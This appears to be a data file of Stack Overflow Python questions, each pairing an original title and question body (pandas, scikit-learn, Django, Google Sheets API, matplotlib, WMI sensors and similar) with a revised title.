Converting a Panda DF List into a string," I have a pandas data frame. One of the columns contains a list. I want that column to be a single string.For example my list ['one','two','three'] should simply be 'one, two, three' gives me ['one, two, three],['four','five','six'] where the second list is from the next row. Needless to say with millions of rows this concatenation across rows is not only incorrect, it kills my memory. <code>  df['col'] = df['col'].astype(str).apply(lambda x: ', '.join(df['col'].astype(str)))",How do I convert a list in a Pandas DF into a string?
Find the end of the month Pandas DataFrame Series," I have a series within a DataFrame that I read in initially as an object, and then need to convert it to a date in the form of yyyy-mm-dd where dd is the end of the month.As an example, I have DataFrame df with a column Date as an object: What I want when this is all said and done is a date object: such that df['Date'].item() returns I've used the following code to get almost there, but all my dates are at the beginning of the month, not the end. Please advise. Note: I've already imported Pandas ad pd, and datetime as dt <code>  ... Date ...... 200104 ...... 200508 ... ... Date ...... 2001-04-30 ...... 2005-08-31 ... datetime.date(2001, 04, 30) df['Date'] = pd.to_datetime(df['Date'], format=""%Y%m"").dt.date",Find the end of the month of a Pandas DataFrame Series
Python/Scikit Lear - Can't handle mix of multiclass and continuous," I'm trying to fit an SGDRegressor to my data and then check the accuracy. The fitting works fine, but then the predictions are not in the same datatype(?) as the original target data, and I get the error When calling print ""Accuracy:"", ms.accuracy_score(y_test,predictions).The data looks like this (just 200 thousand + rows): The code is as follows: What should I do differently? Thank you! <code>  ValueError: Can't handle mix of multiclass and continuous Product_id/Date/product_group1/Price/Net price/Purchase price/Hour/Quantity/product_group20 107 12/31/2012 10 300 236 220 10 1 108 from sklearn.preprocessing import StandardScalerimport numpy as npfrom sklearn.linear_model import SGDRegressorimport numpy as npfrom sklearn import metrics as msmsk = np.random.rand(len(beers)) < 0.8train = beers[msk]test = beers[~msk]X = train [['Price', 'Net price', 'Purchase price','Hour','Product_id','product_group2']]y = train[['Quantity']]y = y.as_matrix().ravel()X_test = test [['Price', 'Net price', 'Purchase price','Hour','Product_id','product_group2']]y_test = test[['Quantity']]y_test = y_test.as_matrix().ravel()clf = SGDRegressor(n_iter=2000)clf.fit(X, y)predictions = clf.predict(X_test)print ""Accuracy:"", ms.accuracy_score(y_test,predictions)",Python/Scikit-Learn - Can't handle mix of multiclass and continuous
"Google Sheets API ""update"" method Error 401 Not Valid Authentication"," I am trying to make a python script that reads and writes to a google spreadsheet. I've basically copied the python quickstart script at https://developers.google.com/sheets/quickstart/python and modified it using the reference at https://developers.google.com/resources/api-libraries/documentation/sheets/v4/python/latest/. Everything works fine with the ""get"" method shown in the quickstart script. I can read the sheet with no errors. To use ""update"" instead of ""get"" (write to the sheet instead of read it), I removed the .readonly portion of the scope url. I also replaced the get() method with update() and included body as an argument in the update() method with a json object containing the values encoded with json.dumps. This was all according to the second reference above.I get an HttpError 400 every time for ""invalid data"".Code: Console errors: <code>  import httplib2import osimport jsonfrom apiclient import discoveryimport oauth2clientfrom oauth2client import clientfrom oauth2client import toolstry: import argparse flags = argparse.ArgumentParser(parents=[tools.argparser]).parse_args()except ImportError: flags = None# If modifying these scopes, delete your previously saved credentials# at ~/.credentials/sheets.googleapis.com-python-quickstart.jsonSCOPES = 'https://www.googleapis.com/auth/spreadsheets'CLIENT_SECRET_FILE = 'client_secret.json'APPLICATION_NAME = 'Google Sheets API Python Quickstart'def get_credentials(): """"""Gets valid user credentials from storage. If nothing has been stored, or if the stored credentials are invalid, the OAuth2 flow is completed to obtain the new credentials. Returns: Credentials, the obtained credential. """""" home_dir = os.path.expanduser('~') credential_dir = os.path.join(home_dir, '.credentials') if not os.path.exists(credential_dir): os.makedirs(credential_dir) credential_path = os.path.join(credential_dir, 'sheets.googleapis.com-python-quickstart.json') store = oauth2client.file.Storage(credential_path) credentials = store.get() if not credentials or credentials.invalid: flow = client.flow_from_clientsecrets(CLIENT_SECRET_FILE, SCOPES) flow.user_agent = APPLICATION_NAME if flags: credentials = tools.run_flow(flow, store, flags) else: # Needed only for compatibility with Python 2.6 credentials = tools.run(flow, store) print('Storing credentials to ' + credential_path) return credentialsdef main(): """"""Shows basic usage of the Sheets API. Creates a Sheets API service object and prints the names and majors of students in a sample spreadsheet: https://docs.google.com/spreadsheets/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms/edit """""" credentials = get_credentials() http = credentials.authorize(httplib2.Http()) discoveryUrl = ('https://sheets.googleapis.com/$discovery/rest?' 'version=v4') service = discovery.build('sheets', 'v4', http=http, discoveryServiceUrl=discoveryUrl) spreadsheetId = '1Wbo5ilhw68IMUTSvnj_2yyRmWJ87NP-lHdJdaPBmTGA' rangeName = 'Class Data!A2:E' body = json.dumps({'values': [[0,0,0,0,0]]}) result = service.spreadsheets().values().update( spreadsheetId=spreadsheetId, range=rangeName, body=body).execute()if __name__ == '__main__': main() Traceback (most recent call last): File ""/Users/user/Dropbox/python/jobs/test.py"", line 73, in <module> main() File ""/Users/user/Dropbox/python/jobs/test.py"", line 69, in main spreadsheetId=spreadsheetId, range=rangeName, body=body).execute() File ""/Library/Frameworks/Python.framework/Versions/3.4/lib/python3.4/site-packages/oauth2client/util.py"", line 135, in positional_wrapper return wrapped(*args, **kwargs) File ""/Library/Frameworks/Python.framework/Versions/3.4/lib/python3.4/site-packages/googleapiclient/http.py"", line 832, in execute raise HttpError(resp, content, uri=self.uri)googleapiclient.errors.HttpError: <HttpError 400 when requesting https://sheets.googleapis.com/v4/spreadsheets/1Wbo5ilhw68IMUTSvnj_2yyRmWJ87NP-lHdJdaPBmTGA/values/Class%20Data%21A2%3AE?alt=json returned ""Invalid value at 'data' (type.googleapis.com/google.apps.sheets.v4.ValueRange), ""{""values"": [[0, 0, 0, 0, 0]]}"""">","Google Sheets API ""update"" method Http Error 400"
Django datetimefield format," I'm getting a validation error when trying to store a date time in a django DateTimeField. The format I'm trying to save is below, together with the error. : In my django settings I have: Should I be converting the format before saving or can I add to DATE_INPUT_FORMATS  <code>  django.core.exceptions.ValidationError: [""'Mon, 23 May 2016 08:30:15 GMT' value has an invalid format. It must be in YYYY-MM-DD HH:MM[:ss[.uuuuuu]][T DATE_INPUT_FORMATS = (""%d %b %Y"", )",Django DateTimeField ValidationError: value has an invalid format
Python's Matplotlib plotting in worng order," Basically I have two arrays, one containing the values of the x-axis and the second containing the values of the y-axis. The problem is, when I do I get thisWhich doesn't make any sense. That is because the plot functions plots everything as it encounters in the x array, not caring whether it's sorted in ascending order or not. How can I sort these two arrays so that the x array is sorted by increasing value and the y axis sorted in the same way so that the points are the same but the plot is connected so that it doesn't make this mess?Thank you in advance! <code>  plt.semilogy(out_samp,error_mc)",Python's Matplotlib plotting in wrong order
What does a dtype of 'O' mean?," I have a dataframe in pandas and I'm trying to figure out what the types of its values are. I am unsure what the type is of column 'Test'. However, when I run myFrame['Test'].dtype, I get; What does this mean? <code>  dtype('O')","What is dtype('O'), in pandas?"
What is dtype('O')?," I have a dataframe in pandas and I'm trying to figure out what the types of its values are. I am unsure what the type is of column 'Test'. However, when I run myFrame['Test'].dtype, I get; What does this mean? <code>  dtype('O')","What is dtype('O'), in pandas?"
Pandas split Column into multiple columns by comma," I am trying to split a column into multiple columns based on comma/space separation.My dataframe currently looks like I would like My code currently removes The KEYS column and I'm not sure why. Could anyone improve or help fix the issue? <code>  KEYS 10 FIT-4270 4000.04391 FIT-4269 4000.0420, 4000.04712 FIT-4268 4000.04193 FIT-4266 4000.04994 FIT-4265 4000.0490, 4000.0499, 4000.0500, 4000.0504, KEYS 1 2 3 4 0 FIT-4270 4000.04391 FIT-4269 4000.0420 4000.04712 FIT-4268 4000.04193 FIT-4266 4000.04994 FIT-4265 4000.0490 4000.0499 4000.0500 4000.0504 v = dfcleancsv[1]#splits the columns by spaces into new columns but removes KEYS?dfcleancsv = dfcleancsv[1].str.split(' ').apply(Series, 1)",Pandas split column into multiple columns by comma
How can I make sense of the `else` statement in python loops?," Many Python programmers are probably unaware that the syntax of while loops and for loops includes an optional else: clause: The body of the else clause is a good place for certain kinds of clean-up actions, and is executed on normal termination of the loop: I.e., exiting the loop with return or break skips the else clause; exiting after a continue executes it. I know this only because I just looked it up (yet again), because I can never remember when the else clause is executed.Always? On ""failure"" of the loop, as the name suggests? On regular termination? Even if the loop is exited with return? I can never be entirely sure without looking it up.I blame my persisting uncertainty on the choice of keyword: I find else incredibly unmnemonic for this semantics. My question is not ""why is this keyword used for this purpose"" (which I would probably vote to close, though only after reading the answers and comments), but how can I think about the else keyword so that its semantics make sense, and I can therefore remember it?I'm sure there was a fair amount of discussion about this, and I can imagine that the choice was made for consistency with the try statement's else: clause (which I also have to look up), and with the goal of not adding to the list of Python's reserved words. Perhaps the reasons for choosing else will clarify its function and make it more memorable, but I'm after connecting name to function, not after historical explanation per se.The answers to this question, which my question was briefly closed as a duplicate of, contain a lot of interesting back story. My question has a different focus (how to connect the specific semantics of else with the keyword choice), but I feel there should be a link to this question somewhere. <code>  for val in iterable: do_something(val)else: clean_up()",When is the `else` clause of Python loops executed?
How can I make sense of the `else` statement in Python loops?," Many Python programmers are probably unaware that the syntax of while loops and for loops includes an optional else: clause: The body of the else clause is a good place for certain kinds of clean-up actions, and is executed on normal termination of the loop: I.e., exiting the loop with return or break skips the else clause; exiting after a continue executes it. I know this only because I just looked it up (yet again), because I can never remember when the else clause is executed.Always? On ""failure"" of the loop, as the name suggests? On regular termination? Even if the loop is exited with return? I can never be entirely sure without looking it up.I blame my persisting uncertainty on the choice of keyword: I find else incredibly unmnemonic for this semantics. My question is not ""why is this keyword used for this purpose"" (which I would probably vote to close, though only after reading the answers and comments), but how can I think about the else keyword so that its semantics make sense, and I can therefore remember it?I'm sure there was a fair amount of discussion about this, and I can imagine that the choice was made for consistency with the try statement's else: clause (which I also have to look up), and with the goal of not adding to the list of Python's reserved words. Perhaps the reasons for choosing else will clarify its function and make it more memorable, but I'm after connecting name to function, not after historical explanation per se.The answers to this question, which my question was briefly closed as a duplicate of, contain a lot of interesting back story. My question has a different focus (how to connect the specific semantics of else with the keyword choice), but I feel there should be a link to this question somewhere. <code>  for val in iterable: do_something(val)else: clean_up()",When is the `else` clause of Python loops executed?
How can I make sense of the `else` clause of Python loops?," Many Python programmers are probably unaware that the syntax of while loops and for loops includes an optional else: clause: The body of the else clause is a good place for certain kinds of clean-up actions, and is executed on normal termination of the loop: I.e., exiting the loop with return or break skips the else clause; exiting after a continue executes it. I know this only because I just looked it up (yet again), because I can never remember when the else clause is executed.Always? On ""failure"" of the loop, as the name suggests? On regular termination? Even if the loop is exited with return? I can never be entirely sure without looking it up.I blame my persisting uncertainty on the choice of keyword: I find else incredibly unmnemonic for this semantics. My question is not ""why is this keyword used for this purpose"" (which I would probably vote to close, though only after reading the answers and comments), but how can I think about the else keyword so that its semantics make sense, and I can therefore remember it?I'm sure there was a fair amount of discussion about this, and I can imagine that the choice was made for consistency with the try statement's else: clause (which I also have to look up), and with the goal of not adding to the list of Python's reserved words. Perhaps the reasons for choosing else will clarify its function and make it more memorable, but I'm after connecting name to function, not after historical explanation per se.The answers to this question, which my question was briefly closed as a duplicate of, contain a lot of interesting back story. My question has a different focus (how to connect the specific semantics of else with the keyword choice), but I feel there should be a link to this question somewhere. <code>  for val in iterable: do_something(val)else: clean_up()",When is the `else` clause of Python loops executed?
Pygal Maps World Not Working," I am trying to create a simple program so as to display the map of Central America with its population using Pygal_maps_world. Here's the code for the same: I have tried a few combinations regarding the importing of the World maps to work properly but to no avail and I am not able to create the visualization. <code>  import pygal_maps_world as pawm=pa.World()wm.title=""Map of Central America""wm.add('North America',{'cd': 84949494949,'mx': 494794164,'us': 99794616})wm.render_to_file('map.svg')",Can't import pygal_maps_world.World
Python 2.7. How to delete empty lines from .txt file," I have a huge input .txt file of this form: and I want to delete all empty lines in order to create a new output .txt file like this: I tried doing it with grep: but I get ""SyntaxError: invalid syntax""When I do it with pandas as someone suggests, I get different number of columns and some integers are converted into floats: e.g.: 1.0 instead of 1When I do it as inspectorG4dget suggests (see below), it works nice, with only 1 problem: the last line is not printed completely: It must be something with my file then...I've already addressed similar posts like these below (and others), but they are not working in my case, mainly due to the reasons explained aboveHow to delete all blank lines in the file with the help of python?one liner for removing blank lines from a file in python? <code>  0 1 0 1 0 0 0 0 0 00 1 0 1 0 0 0 0 0 00 1 0 1 0 0 0 0 0 0 0 1 0 1 0 0 0 0 0 00 1 0 1 0 0 0 0 0 00 1 0 1 0 0 0 0 0 0 grep -v '^$' test1.txt > test2.txt with open('path/to/file') as infile, open('output.txt', 'w') as outfile: for line in infile: if not line.strip(): continue # skip the empty line outfile.write(line) # non-empty line. Write it to output",How to delete empty lines from a .txt file
selecting values from a JSON file in Python," I am getting JIRA data using the following python code,how do I store the response for more than one key (my example shows only one KEY but in general I get lot of data) and print only the values corresponding to total,key, customfield_12830, summary response.json() OUTPUT:-http://pastebin.com/h8R4QMgB <code>  import requests import json import logging import datetime import base64 import urllib serverURL = 'https://jira-stability-tools.company.com/jira' user = 'username' password = 'password' query = 'project = PROJECTNAME AND ""Build Info"" ~ BUILDNAME AND assignee=ASSIGNEENAME' jql = '/rest/api/2/search?jql=%s' % urllib.quote(query) response = requests.get(serverURL + jql,verify=False,auth=(user, password)) print response.json()",Selecting values from a JSON file in Python
Efficient and precise calculation of the Euclidean Distance in Python," Following some online research (1, 2, numpy, scipy, scikit, math), I have found several ways for calculating the Euclidean Distance in Python: I was wondering if someone could provide an insight on which of the above (or any other that I have not found) is considered the best in terms of efficiency and precision. If someone is aware of any resource(s) which discusses the subject that would also be great.The context I am interesting in is in calculating the Euclidean Distance between pairs of number-tuples, e.g. the distance between (52, 106, 35, 12) and (33, 153, 75, 10). <code>  # 1numpy.linalg.norm(a-b)# 2distance.euclidean(vector1, vector2)# 3sklearn.metrics.pairwise.euclidean_distances # 4sqrt((xa-xb)^2 + (ya-yb)^2 + (za-zb)^2)# 5dist = [(a - b)**2 for a, b in zip(vector1, vector2)]dist = math.sqrt(sum(dist))# 6math.hypot(x, y)",Efficient and precise calculation of the euclidean distance
"Group by Timegrouper group ""backwards"""," I have a DataFrame containing a time series: Last entry is 2016-06-07 23:00:00. I now want to group this by, say two days, basically like so: However, I want to group starting from my last data point backwards, so instead of getting this result: I'd much rather expect this: and when grouping by '3D': Expected outcome when grouping by '4D' is: I am not able to get this with every combination of closed, label etc. I could think of. How can I achieve this? <code>  rng = pd.date_range('2016-06-01', periods=24*7, freq='H')ones = pd.Series([1]*24*7, rng)rdf = pd.DataFrame({'a': ones}) rdf.groupby(pd.TimeGrouper('2D')).sum() a2016-06-01 482016-06-03 482016-06-05 482016-06-07 24 a2016-06-01 242016-06-03 482016-06-05 482016-06-07 48 a2016-06-01 242016-06-04 722016-06-07 72 a2016-06-03 722016-06-07 96",Groupby with TimeGrouper 'backwards'
Reverse column values in pandas.DataFrame," I've got a pandas DataFrame with a boolean column sorted by another column and need to calculate reverse cumulative sum of the boolean column, that is, amount of true values from current row to bottom.Example I need something that will give me a new column with values That is, for each row it should contain amount of True values on this row and rows below.I've tried various methods using .iloc[::-1] but result is not that is desired.It looks like I'm missing some obvious bit of information. I've starting using Pandas only yesterday. <code>  In [13]: df = pd.DataFrame({'A': [True] * 3 + [False] * 5, 'B': np.random.rand(8) })In [15]: df = df.sort_values('B')In [16]: dfOut[16]: A B6 False 0.0377102 True 0.3154144 False 0.3324807 False 0.4455053 False 0.5801561 True 0.7415515 False 0.7969440 True 0.817563 33222211",Reversed cumulative sum of a column in pandas.DataFrame
Python- How do i use Linux terminal commands like CD and LS?," How do i add terminal commands to my Python script? I have a huge folder of images/videos/folders with more images/videos, and i want to organize them in a HTML file (FirstPage.html).The script first lists all the files in the directory: Then checks if the file is a image or a video, and if its a video, it adds to the HTML file: and if its a image it adds: The code is: this is FirstPag.html: I want this script to list the files in the directory, add all images/ videos that are there to the HTML file, then cd into the folders there, and do the same thing, recursively. Any sugestions?Thanks! <code>  def listFiles(): command = ""ls"" output = Popen(command, stdout=PIPE) #This is the only way i found to run LS in terminal and get the output x = str(output.stdout.read()) x = x[2:-3] x += ("" "") x = re.sub(r""\\n"", "" "", x) y = """" finalLIST = list() for o in x: if o == "" "": finalLIST.append(str(y)) y = """" else: y += o return finalLIST #returns a list with all files in the current directory <video controls> <source src=""videoName.mp4"" type=""video/WebM/mp4""> <source src=""videoName.ogg"" type=""video/ogg""> Video not suported!</video> <img src=""ImageName.jpg"" alt=""image""/> def organize(): DIRECTORIES = listFiles() IMAGE = ["".png"", "".jpg""] VIDEO = ["".webm"", "".mp4""] for x in DIRECTORIES: if not re.search(""."", x): #This means that it is a directory #I want to CD into this directory and run listFiles() and then organize() it. How i do it? else: for y in IMAGE: ADDimg = ""\n<img src=\"""" + x + ""\"" alt=\""imagem\""/>\n"" if re.search(y, x): with open(FirstPage.html) as f: for line in f: if line = ""<!--IMAGES-->"": f.write(ADDimg) break f.write(ADDimg) for y in VIDEO: ADDvideo = """"""\n<video controls> <source src=\"""""""" + x """"""\"" type=""video/WebM/mp4""> <source src=""video.ogg"" type=""video/ogg/WebM""> Video not suported! </video>\n """""" if re.search(y, x): with open(FirstPage.html) as f: for line in f: if line = ""<!--VIDEOS-->"": f.write(ADDvideo) break <!DOCTYPE html><html lang=""en""><head> <meta charset=""UTF-8""> <title>The first page</title></head><body> <!--IMAGES--> <!--VIDEOS--></body></html>",How do i use Linux terminal commands like CD and LS?
Python import csv to sqlite short code (pandas?) with non-standard characters," I need to import a CSV file in Python on Windows. My file is delimited by ';' and has strings with non-English symbols and commas (','). I've read posts:Importing a CSV file into a sqlite3 database table using PythonPython import csv to listWhen I run: I get an issue: comma is changed to '-' symbol.When I try: I got errors: pandas.io.common.CParserError: Error tokenizing data. C error: Expected 1 fields in line 13, saw 2.Please help. I would prefer to use pandas as the code is shorter without listing all field names from the CSV file. I understand there could be the work around of temporarily replacing commas. Still, I would like to solve it by some parameters to pandas. <code>  with open('d:/trade/test.csv', 'r') as f1: reader1 = csv.reader(f1) your_list1 = list(reader1) df = pandas.read_csv(csvfile)","Python import CSV short code (pandas?) delimited with ';' and ',' in entires"
Python import csv to sqlite short code (pandas?) with non-standard characters and commas in string," I need to import a CSV file in Python on Windows. My file is delimited by ';' and has strings with non-English symbols and commas (','). I've read posts:Importing a CSV file into a sqlite3 database table using PythonPython import csv to listWhen I run: I get an issue: comma is changed to '-' symbol.When I try: I got errors: pandas.io.common.CParserError: Error tokenizing data. C error: Expected 1 fields in line 13, saw 2.Please help. I would prefer to use pandas as the code is shorter without listing all field names from the CSV file. I understand there could be the work around of temporarily replacing commas. Still, I would like to solve it by some parameters to pandas. <code>  with open('d:/trade/test.csv', 'r') as f1: reader1 = csv.reader(f1) your_list1 = list(reader1) df = pandas.read_csv(csvfile)","Python import CSV short code (pandas?) delimited with ';' and ',' in entires"
"Python import csv short code (pandas?) delimited with ';' and ',' in entires"," I need to import a CSV file in Python on Windows. My file is delimited by ';' and has strings with non-English symbols and commas (','). I've read posts:Importing a CSV file into a sqlite3 database table using PythonPython import csv to listWhen I run: I get an issue: comma is changed to '-' symbol.When I try: I got errors: pandas.io.common.CParserError: Error tokenizing data. C error: Expected 1 fields in line 13, saw 2.Please help. I would prefer to use pandas as the code is shorter without listing all field names from the CSV file. I understand there could be the work around of temporarily replacing commas. Still, I would like to solve it by some parameters to pandas. <code>  with open('d:/trade/test.csv', 'r') as f1: reader1 = csv.reader(f1) your_list1 = list(reader1) df = pandas.read_csv(csvfile)","Python import CSV short code (pandas?) delimited with ';' and ',' in entires"
How to get the last element of a level in a multiindex?," I have a dataframe in this format: a and b are indexes, x is the value.I want to get rows 1 9 73 and 2 5 34, in other words, the last row of that level.I've been messing with .loc, .iloc, and .xs for an hour, but I can't get it to work. How do I do this? <code>  a b x1 1 311 2 11 3 421 4 4231 5 421 6 31 7 441 8 654371 9 732 1 56562 2 72 3 52 4 52 5 34",Getting the last element of a level in a multiindex
How to turn a string into a dict in Python," I have a string Please not that the keys to the dictionary entries are unquoted, so a simple eval(""{a:'b', c:'d',e:''}"") as suggested in a previous question does not work.What would be the most convenient way to convert this string to a dictionary? <code>  ""{a:'b', c:'d',e:''}"" {'a':'b', 'c':'d', 'e':''}",How to turn a string with unquoted keys into a dict in Python
Django cleaning decimal before saving," I want to automatically round Django's DecimalField according to the max_digits and decimal_places attributes before calling save() function in ModelForm.currently using the following:django 1.8python 2.7What I have tried so far.https://djangosnippets.org/snippets/10554/models.py views.pyP.S. gonna apply it in different fields and in different models forms.pyI plan to clean the fields in clean() function and do the rounding off of all decimal fields but when I try to print the raw_data, there's no 'amount field'. <code>  amount = models.DecimalField(max_digits = 19, decimal_places = 2) data = {""amount"" : 100.1234,""name"":""John Doe"",...}form = My_form(data)if form.is_valid(): //the error throws from here. form.save()else: raise ValueError(form.errors) class My_form(forms.ModelForm): Class Meta: model = My_model fields = ('amount','name') def clean(self): raw_data = self.cleaned_data print(raw_data) //only prints {'name' : 'John Doe'}",Automatically round Django's DecimalField according to the max_digits and decimal_places attributes before calling save()
Keras(Python library) model.predict()and model.fit()," I'm going through this reinforcement learning tutorialand It's been really great so far but could someone please explain what and mean?As in what do the arguments bach_size, nb_epoch and verbose do?I know neural networks so explaining in terms of that would be helpful.You could also send me a link where the documentation of these functions can be found. <code>  newQ = model.predict(new_state.reshape(1,64), batch_size=1) model.fit(X_train, y_train, batch_size=batchSize, nb_epoch=1, verbose=1)",What do model.predict() and model.fit() do?
Python 3: how to use requests module to send PATCH request with headers including authentication token," I have a Rails 4 application which uses token based authentication for APIs and need to be able to update records through Python 3 script.My current script looks like this which works OK if I disable API authentication. I can't figure out how to add headers to it, requests.patch only takes two parameters according to docs. I would need to get to the point where the following header info would added This type of header works OK in curl. How can I do this in Python 3 and requests? <code>  import requestsimport jsonurl = 'http://0.0.0.0:3000/api/v1/update_experiment.json'payload = {'expt_name' : 'A60E001', 'status' : 'done' }r = requests.patch(url, payload) 'Authorization:Token token=""xxxxxxxxxxxxxxxxxxxxxx""'",How to use requests to send a PATCH request with headers
How to input data within iPython Notebook," I have searched for but have not found a solution to this:Is there a way to create data within Jupyter Notebook, particularly tabular data in the form of a pandas DataFrame, via a spreadsheet-like interface as opposed to pd.DataFrame({a:[],b:[]})?I don't mean read csv or XLwings as solutions, but rather a 'spreadsheet' in the notebook itself so that all information can be edited and stored in one place, and using it feels familiar to a more broad category of people.Open to creative ideas.Thanks, <code> ",How to input data within Jupyter Notebook
Python - Get sensor values and fan speeds - Windows 10," I've been trying to get a Python script to show temperatures for CPU, GPU and other availabile sensors in my hardware, but I haven't found anything useful.I tried using WMI to get those values, but my processor is apparently not supported.The code I used was: which I got from another stackoverflow thread, and I get thrown the errorTraceback (most recent call last): which, according to Microsoft Support, means Not Supported (0x8004100C)I have tried running the command-line version of this code in a cmd.exe window ran as an administrator, but I got the same error.Is there any other way to access CPU and GPU temperatures?PS: My OS is Windows 10 and my CPU is AMD FX-8350. I am unsure whether my OS or my CPU are at fault for this error. <code>  import wmiw = wmi.WMI(namespace=""root\wmi"")temperature_info = w.MSAcpi_ThermalZoneTemperature()[0]print temperature_info.CurrentTemperature File ""C:/Users/Joe/Desktop/test.py"", line 3, in <module> temperature_info = w.MSAcpi_ThermalZoneTemperature()[0] File ""C:\Python27\lib\site-packages\wmi.py"", line 819, in query handle_com_error () File ""C:\Python27\lib\site-packages\wmi.py"", line 241, in handle_com_error raise klass (com_error=err)x_wmi: <x_wmi: Unexpected COM Error (-2147217396, 'OLE error 0x8004100c', None, None)>",Get sensor values (like Temperature of GPU and CPU) and fan speeds of Windows 10 PC
Get sensor values and fan speeds," I've been trying to get a Python script to show temperatures for CPU, GPU and other availabile sensors in my hardware, but I haven't found anything useful.I tried using WMI to get those values, but my processor is apparently not supported.The code I used was: which I got from another stackoverflow thread, and I get thrown the errorTraceback (most recent call last): which, according to Microsoft Support, means Not Supported (0x8004100C)I have tried running the command-line version of this code in a cmd.exe window ran as an administrator, but I got the same error.Is there any other way to access CPU and GPU temperatures?PS: My OS is Windows 10 and my CPU is AMD FX-8350. I am unsure whether my OS or my CPU are at fault for this error. <code>  import wmiw = wmi.WMI(namespace=""root\wmi"")temperature_info = w.MSAcpi_ThermalZoneTemperature()[0]print temperature_info.CurrentTemperature File ""C:/Users/Joe/Desktop/test.py"", line 3, in <module> temperature_info = w.MSAcpi_ThermalZoneTemperature()[0] File ""C:\Python27\lib\site-packages\wmi.py"", line 819, in query handle_com_error () File ""C:\Python27\lib\site-packages\wmi.py"", line 241, in handle_com_error raise klass (com_error=err)x_wmi: <x_wmi: Unexpected COM Error (-2147217396, 'OLE error 0x8004100c', None, None)>",Get sensor values (like Temperature of GPU and CPU) and fan speeds of Windows 10 PC
How to create a unit vector in Tensorflow," This is a pretty simple question that I just can't seem to figure out. I am working with an an output tensor of shape [100, 250]. I want to be able to access the 250 Dimensional array at any spot along the hundred and modify them separately. The tensorflow mathematical tools that I've found either do element-wise modification or scalar modification on the entire tensor. However, I am trying to do scalar modification on subsets of the tensor.EDIT:Here is the numpy code that I would like to recreate with tensorflow methods: This for loop follows this formula in 250-D instead of 3-D. I then multiply each unit vector by magnitude to re-shape it to my desired length.So update here is the numpy [100, 250] dimensional output. I want to transform each 250 dimensional vector into its unit vector. That way I can change its length to a magnitude of my choosing. Using this numpy code, if I run my train_step and pass update into one of my placeholders it returns the error: This is because I've done the math in numpy and ported it back into tensorflow. Here is a related stackoverflow question that did not get answered.the tf.nn.l2_normalize is very close to what I am looking for, but it divides by the square root of the maximum sum of squares. Whereas I am trying to divide each vector by its own sum of squares.Thanks! <code>  update = sess.run(y, feed_dict={x: batch_xs})for i in range(len(update)): update[i] = update[i]/np.sqrt(np.sum(np.square(update[i]))) update[i] = update[i] * magnitude sess.run(train_step, feed_dict={x: batch_xs, prediction: output}) No gradients provided for any variable",How to transform vector into unit vector in Tensorflow
Matplotlib Line3DCollection multicolored line smoothend," Based on the matplotlib example code I constructed a 3D version of a multicolored line. I am working in a jupyter notebook and by using %matplotlib notebook I may zoom into the plot and the corner edges are rendered smoothly in my browser - perfect! However, when I export the plot as png or pdf file for further usage the corner edges are ""jagged"".Any ideas how to smoothen the 3D-multicolored line? <code>  import numpy as npimport matplotlib.pyplot as pltfrom matplotlib.colors import ListedColormap, BoundaryNorm from mpl_toolkits.mplot3d import Axes3Dfrom mpl_toolkits.mplot3d.art3d import Line3DCollection%matplotlib notebook# Generate random datanp.random.seed(1)n = 20 # number of data points#set x,y,z datax = np.random.uniform(0, 1, n)y = np.random.uniform(0, 1, n)z = np.arange(0,n)# Create a colormap for red, green and blue and a norm to color# f' < -0.5 red, f' > 0.5 blue, and the rest greencmap = ListedColormap(['r', 'g', 'b'])norm = BoundaryNorm([-1, -0.5, 0.5, 1], cmap.N)#################### 3D Figure ##################### Create a set of line segmentspoints = np.array([x, y, z]).T.reshape(-1, 1, 3)segments = np.concatenate([points[:-1], points[1:]], axis=1)# Create the 3D-line collection objectlc = Line3DCollection(segments, cmap=plt.get_cmap('copper'), norm=plt.Normalize(0, n))lc.set_array(z) lc.set_linewidth(2)#plotfig = plt.figure()ax = fig.gca(projection='3d')ax.set_zlim(0, max(z))plt.title('3D-Figure')ax.add_collection3d(lc, zs=z, zdir='z')#save plotplt.savefig('3D_Line.png', dpi=600, facecolor='w', edgecolor='w', orientation='portrait')","Matplotlib Line3DCollection multicolored line edges are ""jagged"""
"What are the uses of iter(callable, sentinal)?"," So, I was watching Raymond Hettinger's talk Transforming Code into Beautiful, Idiomatic Python and he brings up this form of iter which I was never aware of. His example is the following:Instead of: Use: After checking the documentation of iter, I found a similar example: This looks pretty useful to me, but I was wondering if of you Pythonistas know of any examples of this construct that doesn't involve I/O-read loops? Perhaps in the Standard Library? I can think of very contrived examples, like the following: But obviously this is not any more useful that the built-in iterables. Also, it seems like code smell to me when you are assigning state to a function. At that point, I'd likely should be working with a class, but if I'm going to write a class, I might as well implement the iterator protocol for whatever I want to accomplish. <code>  blocks = []while True: block = f.read(32) if block == '': break blocks.append(block) blocks = []read_block = partial(f.read, 32)for block in iter(read_block, ''): blocks.append(block) with open('mydata.txt') as fp: for line in iter(fp.readline, ''): process_line(line) >>> def f():... f.count += 1... return f.count... >>> f.count = 0>>> list(iter(f,20))[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19]>>> ","What are the uses of iter(callable, sentinel)?"
Changing multiple column names but not all of them - Panda Python," I would like to know if there is a function to change specific column names but without selecting a specific name or without changing all of them.I have the code: But with it i have to manually change each one of them writing each name.Also to change all of them I have I would like to have a function to change columns 1 and 3 without writing their names just stating their location. <code>  df=df.rename(columns = {'nameofacolumn':'newname'}) df = df.columns['name1','name2','etc']",Changing multiple column names but not all of them - Pandas Python
Turn of logging in schedule library," Objective: prevent schedule from logging every time it runs.Background:I am using the logging and schedule libraries in a python project. My log file contains information about the physical state of a instrument run by a Raspberry Pi, and is updated every 10 seconds.I use the schedule library to schedule that periodic log.Here is the limited documentation I have found for schedule.The Problem:The schedule library logs this statement, every time it runs a job. The function that schedule calls is update_log(), a function that calculates the variables included in the log I run every ten seconds and logs them (example below). Because schedule is producing its own (fairly useless) log line, it makes the logging I am actually trying to do very difficult to read.The Goal:Prevent schedule from logging that first statement. <code>  2016-06-29 09:01:51,022 INFO: Running job every 10 seconds do update_log() (Last run... 2016-06-29 09:01:51,022 INFO: Dist: 12.3 m Rate: 23.8 cm/s",Turn off logging in schedule library
